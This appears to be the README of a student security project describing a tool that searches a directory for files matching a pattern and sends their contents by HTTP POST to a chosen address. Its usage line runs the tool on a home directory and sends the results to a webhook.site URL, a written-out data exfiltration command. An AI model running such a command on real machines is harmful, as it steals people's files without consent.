# bhg-final-project
This project is designed to test how files can be exfiltrated from
a target machine. The program will locate all files matching a given
regular expression pattern and create an HTTP POST with the data and
the filenames.

#Usage
Call the fileSearch executable with the directory you would like to 
search, along with the destination address the data will be sent to.
./fileSearch /home/user/ https://webhook.site/27227c6f-b632-4b50-ae7e-a38b18629b2c
